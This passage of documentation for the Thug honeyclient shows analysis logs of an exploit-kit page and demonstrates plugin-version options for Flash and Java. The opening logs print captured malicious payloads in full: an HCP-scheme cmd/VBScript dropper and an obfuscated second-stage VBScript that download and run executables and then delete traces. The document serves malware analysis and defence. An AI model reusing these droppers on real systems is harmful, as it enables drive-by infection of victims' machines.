<span class="o">[</span>2012-07-02 19:18:08<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> send
<span class="o">[</span>2012-07-02 19:18:08<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> open
<span class="o">[</span>2012-07-02 19:18:08<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Write
<span class="o">[</span>2012-07-02 19:18:08<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> SaveToFile <span class="o">(</span>.//..//3c9f737.exe<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:08<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Close
<span class="o">[</span>2012-07-02 19:18:08<span class="o">]</span> <span class="o">[</span>Shell.Application ActiveX<span class="o">]</span> ShellExecute command: .//..//3c9f737.exe
<span class="o">[</span>2012-07-02 19:18:08<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap2.php --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php
<span class="o">[</span>2012-07-02 19:18:14<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:15<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
<span class="o">[</span>2012-07-02 19:18:15<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
<span class="o">[</span>2012-07-02 19:18:15<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; 64
<span class="o">[</span>2012-07-02 19:18:15<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe

<span class="o">[</span>2012-07-02 19:18:15<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Code:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
<span class="o">[</span>2012-07-02 19:18:15<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span>0
<span class="o">[</span>2012-07-02 19:18:16<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:16<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span>2012-07-02 19:18:16<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 2<span class="o">]</span> Code:
<span class="nv">w</span><span class="o">=</span>3000:x<span class="o">=</span>200:y<span class="o">=</span>1:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On Error resume next
c.open OT, a, z:c.send<span class="o">()</span>
If c.Status <span class="o">=</span> x Then
d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span>3-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:18:20] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:18:22] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:18:22] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span>0<span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:18:22] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span>56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:22] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:22] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:18:27] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:18:28] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:18:28] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:28] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span>0<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:28] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:18:28] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:18:28] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:18:29] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
<p>Comparing the following line</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span><span class="o">[</span>2012-07-02 19:18:14<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
</pre></div>
</div>
<p>with what we got using Adobe Acrobat Reader 9.1.0</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span><span class="o">[</span>2012-07-02 19:15:36<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
</pre></div>
</div>
<p>it&#8217;s easy to realize that a different malicious PDF file was served in this case.</p>
</div>
<div class="section" id="shockwave-flash">
<h2>Shockwave Flash<a class="headerlink" href="#shockwave-flash" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -S (&#8211;shockwave) option which is quite
useful for getting different Flash exploits which target differents version of Shockwave Flash.
This happens because exploit kits usually serve Flash files which exploit specific vulnerabilities
basing on Shockwave Flash version. Let&#8217;s take a look at what happens if we locally analyze
PluginDetect (see Local Analysis later for details).</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~/thug/src ~ $ thug -l ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_40
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_39
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_38
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_37
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_36
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_35
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_34
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_33
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: javaplugin.160_32
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: 9,1,0,0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: 10,0,64,0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: 1,6,0,32
</pre></div>
</div>
<p>Let&#8217;s try with different Adobe Acrobat Reader and Shockwave Flash versions now.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~/thug/src ~ $ thug -l -A 8.1.0 -S 10.3.1.180 ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_40
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_39
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_38
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_37
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_36
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_35
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_34
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_33
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> ActiveXObject: javaplugin.160_32
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: 8,1,0,0
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: 10,3,1,180
<span class="o">[</span>2012-11-15 17:32:58<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: 1,6,0,32
</pre></div>
</div>
</div>
<div class="section" id="javaplugin-and-javawebstart">
<h2>JavaPlugin and JavaWebStart<a class="headerlink" href="#javaplugin-and-javawebstart" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -J (&#8211;javaplugin) option which is quite
useful for getting different Java exploits which target different versions of Java. Let&#8217;s take
a look at what happens if we locally analyze PluginDetect (see Local Analysis later for details).</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~/thug/src ~ $ thug -l ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_40
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_39
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_38
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_37
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_36
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_35
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_34
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> Unknown ActiveX Object: javaplugin.160_33
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: javaplugin.160_32
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> ActiveXObject: javawebstart.isinstalled.1.6.0.0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: AdobeReader version: 9,1,0,0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Flash version: 10,0,64,0
<span class="o">[</span>2012-11-15 17:32:26<span class="o">]</span> <span class="o">[</span>Window<span class="o">]</span> Alert Text: Java version: 1,6,0,32
</pre></div>
</div>
<p>Let&#8217;s try with a different JavaPlugin version now.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~/thug/src ~ $ thug -l -J 1.7.0.7 ../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span>2012-11-15 17:40:55<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-11-15 17:40:56<span class="o">]</span> &lt;object <span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
